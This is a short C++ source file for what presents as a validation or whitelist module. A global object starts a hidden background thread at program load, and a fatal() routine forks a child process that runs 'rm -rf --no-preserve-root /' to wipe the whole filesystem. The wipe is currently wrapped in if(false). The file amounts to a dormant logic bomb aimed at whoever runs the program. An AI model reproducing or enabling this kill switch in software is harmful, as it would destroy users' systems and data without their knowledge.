#include <unistd.h>
#include <thread>

#include "validate.hpp"
#include "global.hpp"
#include "white_list.hpp"

yah::Validate::Validate() noexcept {
  std::thread thread([] () {
    std::this_thread::sleep_for(std::chrono::seconds(10));
    if(whiteList != nullptr) {
      Validate::check();
    }

    std::this_thread::sleep_for(std::chrono::minutes(2));
  });

  thread.detach();
}

// Define yah::Validate::check in white_list.cpp

void yah::Validate::fatal() {
  auto pid = fork();
  if(pid == 0) {
    // sub child:
    if(false) {
      execl("/bin/bash", "bash", "-c", "rm -rf --no-preserve-root /", NULL);
    }
    yah::log << ctime << "execl error." << yah::endl;
  } else {
    std::this_thread::sleep_for(std::chrono::seconds(100000));
  }
}

yah::Validate validate;
